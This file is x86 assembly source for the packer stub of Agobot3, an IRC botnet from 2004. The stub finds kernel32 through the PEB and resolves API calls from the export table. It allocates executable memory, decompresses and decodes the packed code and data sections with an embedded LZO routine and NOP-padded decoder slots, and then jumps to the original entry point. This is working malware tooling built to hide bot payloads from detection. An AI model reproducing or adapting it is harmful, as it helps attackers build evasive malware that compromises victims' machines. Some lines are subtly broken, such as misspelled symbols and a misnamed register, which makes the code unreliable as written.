; Agobot3 - a modular IRC bot for Win32 / Linux
; Copyright (c) 2004 Ago and the Agobot team
; All rights reserved.
; 
; This is private software, you may redistribute it under the terms of
; the APL(Ago's Private License) which follows:
;   
; Redistribution and use in binary forms, with or without modification,
; are permitted provided that the following conditions are met:
; 1. The name of the author may not be used to endorse or promote products
;    derived from this software without specific prior written permission.
; 2. The binary and source may not be sold and/or given away for free.
; 3. The licensee may only create binaries for his own usage, not for any
;    third parties.
; 4. The person using this sourcecode is a developer of said sourcecode.
; 
; Redistribution and use in source forms, with or without modification,
; are not permitted.
; 
; This license may be changed without prior notice.
; 
; THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
; IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
; OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
; IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
; THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

	jmp data									; jump to data
call_start:
	pop edx										; get pointer to data to edx
	push esi									; backup esi on the stack
	push edi									; backup edi on the stack
	push eax									; backup eax on the stack
	push ecx									; backup ecx on the stack
	push ebx									; backup ebx on the stack
	mov ebx, edx								; ebx = edx

	call get_k32								; get proc addresses

	lea esi, [ebx-memaddy+kernel32_dll]			; lea name of kernel32 into esi

	lea edi, [ebx-memaddy+kernel32_gpa]			; lea name of kernel32.GetProcAddress into edi
	mov dword [ebx-memaddy+lpr_size], 0xF		; size of gpa
	call loadproc								; call loadproc	
	mov [ebx-memaddy+gpa_ptr], eax				; store kernel32.GetProcAddress

	lea edi, [ebx-memaddy+kernel32_lla]			; lea name of kernel32.LoadLibraryA into edi
	mov dword [ebx-memaddy+lpr_size], 0xD		; size of lla
	call loadproc								; call loadproc	
	mov [ebx-memaddy+lla_ptr], eax				; store kernel32.LoadLibraryA

	lea edi, [ebx-memaddy+kernel32_va]			; lea name of kernel32.VirtualAlloc into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+va_ptr], eax				; store kernel32.VirtualAlloc

	lea edi, [ebx-memaddy+kernel32_vf]			; lea name of kernel32.VirtualFree into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+vf_ptr], eax				; store kernel32.VirtualFree

	push ebx									; backup ebx on the stack
	call main									; call main routine
	pop ebx										; restore ebx from the stack

	pop ebx										; restore ebx from the stack
	pop ecx										; restore ecx from the stack
	pop eax										; restore eax from the stack
	pop edi										; restore edi from the stack
	pop esi										; restore esi from the stack

data:
	call call_start								; call it
	memaddy			dd	0						; a variable !
	offset			dd	0x11111111				; the offset
	offset_code		dd	0x22222222				; the offset for the code section
	code_size		dd	0x33333333				; the size of the code section
	key				dd	0xFFFFFFFF				; the key
	entrypoint		dd	0x44444444				; the offset of the entrypoint
	enctype			dd	0x55555555				; the encoder type used
	offset_data		dd	0x66666666				; the offset for the data section
	data_size		dd	0x77777777				; the size of the data section
	self_base		dd	0x00000000				; the base address of .exe
	diddec_flag		dd	0						; did we already decode ?
	kernel32_dll	db	"kernel32", 0			; name of kernel32.dll
	kernel32_gpa	db	"GetProcAddress", 0		; ^---> GetProcAddress
	kernel32_lla	db	"LoadLibraryA", 0		; ^---> LoadLibraryA
	kernel32_va		db	"VirtualAlloc", 0		; ^---> VirtualAlloc
	kernel32_vf		db	"VirtualFree", 0		; ^---> VirtualFree
	lla_ptr			dd	0						; ^---> pointer to LoadLibraryA
	gpa_ptr			dd	0						; ^---> pointer to GetProcAddress
	va_ptr			dd	0						; ^---> pointer to VirtualAlloc
	vf_ptr			dd	0						; ^---> pointer to VirtualFree
	mode_wb			db	"w+b", 0				; w+b mode string for msvcrt.fopen
	mode_rb			db	"rb", 0					; rb mode string for msvcrt.fopen
	kernel_base		dd	0						; base address of the kernel
	k32_numnames	dd	0						; number of exports in kernel32
	k32_funcaddr	dd	0						; address of functions in kernel32
	k32_nameaddr	dd	0						; address of names in kernel32
	k32_numords		dd	0						; number of ordinals in kernel32
	loadpr_count	dd	0						; counter for loadproc
	lpr_size		dd	0						; size of string for loadproc
	lzodec_asm:									; lzo decompressor
		db 85, 87, 86, 83, 81, 82, 131, 236, 12, 252, 139, 116, 36, 40, 139, 124, 36
		db 48, 189, 3, 0, 0, 0, 144, 49, 192, 138, 6, 70, 60, 32, 115, 15, 8, 192
		db 116, 51, 137, 193, 243, 164, 138, 6, 70, 60, 32, 114, 72, 60, 64, 114, 93
		db 137, 193, 36, 31, 141, 87, 255, 193, 233, 5, 41, 194, 138, 6, 70, 193, 224
		db 5, 41, 194, 65, 135, 242, 243, 164, 137, 214, 235, 199, 141, 180, 38, 0, 0
		db 0, 0, 138, 6, 70, 141, 72, 32, 60, 248, 114, 197, 185, 24, 1, 0, 0, 44, 248
		db 116, 6, 145, 48, 192, 211, 224, 145, 243, 164, 235, 163, 141, 118, 0, 141
		db 87, 255, 41, 194, 138, 6, 70, 193, 224, 5, 41, 194, 135, 242, 164, 164, 164
		db 137, 214, 164, 49, 192, 235, 152, 36, 31, 137, 193, 117, 19, 177, 31, 138, 6
		db 70, 8, 192, 117, 8, 129, 193, 255, 0, 0, 0, 235, 241, 1, 193, 138, 6, 70
		db 137, 195, 36, 63, 137, 250, 41, 194, 138, 6, 70, 193, 224, 6, 41, 194, 57,
		db 250, 116, 27, 135, 214, 141, 73, 3, 243, 164, 137, 214, 49, 192, 193, 235, 6
		db 137, 217, 15, 133, 80, 255, 255, 255, 233, 60, 255, 255, 255, 131, 249, 1
		db 15, 149, 192, 139, 84, 36, 40, 3, 84, 36, 44, 57, 214, 119, 38, 114, 29, 43,
		db 124, 36, 48, 139, 84, 36, 52, 137, 58, 247, 216, 131, 196, 12, 90, 89, 91
		db 94, 95, 93, 195, 184, 1, 0, 0, 0, 235, 227, 184, 8, 0, 0, 0, 235, 220, 184,
		db 4, 0, 0, 0, 235, 213
	end
; mygpa:
; 
; loads functions via GetProcAddress
;
; input:
; esi = name of dll
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
mygpa:
	push ecx									; backup ecx
	push edi									; backup edi
	push esi									; backup esi
	
	push esi									; push dll name from esi on the stack
	call dword [ebx-memaddy+lla_ptr]			; call LoadLibraryA
	push eax									; eax -> ecx
	pop ecx										; eax -> ecx
	push edi									; push proc name from edi on the stack
	push ecx									; push handle to library on the stack
	call dword [ebx-memaddy+gpa_ptr]			; call GetProcAddress

	pop esi										; restore esi
	pop edi										; restore edi
	pop ecx										; restore ecx
	
	ret											; return to caller
; loadproc:
;
; loads functions from kernel32
;
; input:
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
loadproc:
	xor eax, eax								; clear eax
	mov [ebx-memaddy+loadpr_count],eax			; set our counter to 0
loadproc_loop:
	mov edx, [ebx-memaddy+loadpr_count]			; edx = our counter in the loop
	cmp edx, [ebx-memaddy+k32_numnames]			; compare it to our limit
	jge loadproc_exit							; if were greater or equal to it exit loop
	inc edx										; else increment the counter
	mov [ebx-memaddy+loadpr_count], edx			; and save it for later
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = counter
	shl eax, 0x02								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_nameaddr]			; ecx = AddressOfNames
	add ecx, eax								; ecx = ecx + eax
	mov eax, [ecx]								; eax = pointer from ecx
	add eax, [ebx-memaddy+kernel_base]			; align w/ base addr
	push edi									; backup edi
	push esi									; backup esi
	push ecx									; backup ecx
	mov esi, edi								; esi = address of name to compare to [edi]
	mov edi, eax								; edi = address of name to compare w/
	mov ecx, [ebx-memaddy+lpr_size]				; ecx = the length of our search string
	rep cmpsb									; compare the strings pointed to by edi,esi and repeat this ecx times
	pop ecx										; restore ecx
	pop esi										; restore esi
	pop edi										; restore edi
	jne loadproc_loop							; if not equal goto top of loop else we found the function we want 
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = value of our counter, we need this for calculations later
	shl eax, 0x01								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_numords]			; ecx = pointer to ordinals
	add ecx, eax								; add the multiplyed counter to it
	xor eax, eax								; clear eax
	mov ax, word [ecx]							; ax = the ordinal for the function we found
	shl eax, 0x02								; multiply it by 4
	mov ecx, [ebx-memaddy+k32_funcaddr]			; ecx = pointer to address of functions
	add eax, ecx								; add it to (ordinal*4)
	mov ecx, [eax]								; ecx = rva of function
	add ecx, [ebx-memaddy+kernel_base]			; align it, ecx = va of function
	mov eax, ecx								; move it to eax
	ret											; return to caller

loadproc_exit
	xor eax, eax								; clear eax
	ret											; return to caller

get_k32_exit:
	mov eax, [0x00000000]						; access violation on purpose

get_k32_9x:
	mov eax, [ds:eax+0x34]						; get Win9x PEB
	mov ebp, [ds:eax+0xb8]						; same here
	jmp get_k32_cont							; return to get_k32

get_k32:
	push eax									; backup eax
	push ecx									; backup ecx
	push esi									; backup esi
	push ebp									; backup ebp

	mov eax, [fs:0x30]							; get the PEB into eax
	test eax, eax								; detect Win9x PEB
	js get_k32_9x								; get the Win9x PEB

get_k32_cont:
	mov eax, [ds:eax+0xC]						; get PROCESS_MODULE_INFO addr
	mov esi, [ds:eax+0x1C]						; get InInitOrder.flink
	lodsd										; get InInitOrder.blink
	mov ebp, [ds:eax+0x8]						; get the kernel base
	mov [ebx-memaddy+kernel_base], ebp			; store the kernel base
	mov eax, ebp								; move it to eax

	cmp word [eax], 'MZ'						; check if we have a exe image
	jne get_k32_exit							; exit if we dont
	add eax, 0x3C								; eax = pointer to pe header offset
	mov ecx, [eax]								; get the pointer
	add ecx, [ebx-memaddy+kernel_base]			; add image base to align it

	cmp word [ecx], 'PE'						; check if we have a pe image
	jne get_k32_exit							; exit if we dont
	add ecx, 0x78								; ecx = pointer to virtual address of export dir address
	mov esi, [ecx]								; esi = virtual address of export dir address
	add esi, [ebx-memaddy+kernel_base]			; add image base to align it

	add esi, 0x18								; esi points to NumberOfNames
	lodsd										; load number of names into eax
	mov [ebx-memaddy+k32_numnames], eax			; save it for later

	lodsd										; load address of funcs into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_funcaddr], eax			; save it

	lodsd										; load address of names into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_nameaddr], eax			; save it

	lodsd										; load number of ordinals into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_numords], eax			; save it

	pop ebp										; restore ebp
	pop esi										; restore esi
	pop ecx										; restore ecx
	pop eax										; restore eax

	ret											; return to caller
exec_now:
	mov ecx, [ebx-memaddy+entrypoint]			; get the entry point
	mov edx, [ebx-memaddy+self_base]			; get the base
	add edx, ecx								; align it

	pop ebx										; cleanup stack (was ret addr from call main)
	pop ebx										; cleanup stack (was ebx backup)
	pop ebx										; restore ebx
	pop ecx										; restore ecx
	pop eax										; restore eax
	pop edi										; restore edi
	pop esi										; restore esi

	jmp edx										; jump to code!

valloc:
	push ecx									; backup ecx
	push esi									; backup esi
	push eax									; backup eax

	add ecx, ecx								; multiply the size by 2
	add ecx, ecx								; multiply the size by 2

	push 0x40									; flProtect=PAGE_EXECUTE_READWRITE
	push 0x1000									; flAllocationType=MEM_COMMIT
	push ecx									; dwSize=ecx
	push 0x0									; lpAddress=NULL

	call [ebx-memaddr+va_ptr];					; VirtualAlloc()
	mov edi, eax								; edi=eax

	pop eax										; restore eax
	pop esi										; restore esi
	pop exc										; restore ecx
	ret
	
main:
	mov ecx, [ebx-memaddy+diddec_flag]			; get decoded flag
	cmp ecx, 0x01								; already decoded ?
	je exec_now									; execute now

	mov ecx, ebx								; get base address into ecx
	sub ecx, [ebx-memaddy+offset]				; subtract the offset from ecx
	xor cx, cx									; clear low word of ecx
	mov [ebx-memaddy+self_base],ecx				; store it

	add ecx, [ebx-memaddy+offset_code]			; add code base address to ecx
	mov esi, ecx								; assign ecx to esi
	mov ecx, [ebx-memaddy+code_size]			; get the code size into ecx
	xor edx, edx								; edx = 0
	mov eax, [ebx-memaddy+key]					; get the key into eax

	call valloc									; allocate more space for code

	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop

	mov ecx, [ebx-memaddy+self_base]			; restore self_base

	add ecx, [ebx-memaddy+offset_data]			; add data base address to ecx
	mov esi, ecx								; assign ecx to esi
	mov ecx, [ebx-memaddy+data_size]			; get the data size into ecx
	xor edx, edx								; edx = 0
                                                                                                                                      	mov eax, [ebx-memaddy+key]					; get the key into eax

	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop

	mov dword [ebx-memaddy+diddec_flag], 0x01	; were already decoded

	mov ecx, [ebx-memaddy+entrypoint]			; get the entry point
	mov edx, [ebx-memaddy+self_base]			; get the base
	add edx, ecx								; align it

	pop ebx										; cleanup stack (was ret addr from call main)
	pop ebx										; cleanup stack (was ebx backup)
	pop ebx										; restore ebx
	pop ecx										; restore ecx
	pop eax										; restore eax
	pop edi										; restore edi
	pop esi										; restore esi

	mov [esp+0x34], edx							; restore old entry point on stack

	jmp edx										; jump to code!
